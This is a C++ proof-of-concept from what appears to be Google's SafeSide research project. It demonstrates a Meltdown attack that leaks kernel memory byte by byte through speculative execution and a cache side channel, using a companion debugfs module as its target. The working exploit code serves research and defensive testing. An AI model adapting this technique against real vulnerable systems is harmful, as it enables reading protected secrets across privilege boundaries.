/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

#include "compiler_specifics.h"

#if !SAFESIDE_LINUX
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_X64 && !SAFESIDE_IA32 && !SAFESIDE_PPC
#  error Unsupported architecture. x86/x86_64 or PowerPC required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include "cache_sidechannel.h"
#include "faults.h"
#include "instr.h"
#include "local_content.h"
#include "meltdown_local_content.h"
#include "utils.h"

// Leaks the byte that is physically located at &text[0] + offset, without
// really loading it. In the abstract machine, and in the code executed by the
// CPU, this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, speculatively loading data accessible only in the kernel mode.
static char LeakByte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    // Load the secret data into cache so it is more likely to be available
    // to transient instructions.
    std::ifstream is("/sys/kernel/debug/safeside_meltdown/secret_data_in_cache");
    is.get();
    is.close();

    sidechannel.FlushOracle();

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    size_t safe_offset = run % strlen(public_data);

    bool handled_fault = RunWithFaultHandler(SIGSEGV, [&]() {
      ForceRead(oracle.data() + static_cast<size_t>(data[safe_offset]));

      // Access attempt to the kernel memory. This does not succeed
      // architecturally and kernel sends SIGSEGV instead.
      ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
    });

    if (!handled_fault) {
      std::cerr << "Read didn't yield expected fault" << std::endl;
      exit(EXIT_FAILURE);
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  size_t private_data, private_length;
  std::ifstream in("/sys/kernel/debug/safeside_meltdown/secret_data_address");
  if (in.fail()) {
    std::cerr << "Meltdown module not loaded or not running as root."
              << std::endl;
    exit(EXIT_FAILURE);
  }
  in >> std::hex >> private_data;
  in.close();

  in.open("/sys/kernel/debug/safeside_meltdown/secret_data_length");
  in >> std::dec >> private_length;
  in.close();

  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset =
      reinterpret_cast<const char *>(private_data) - public_data;
  for (size_t i = 0; i < private_length; ++i) {
    std::cout << LeakByte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
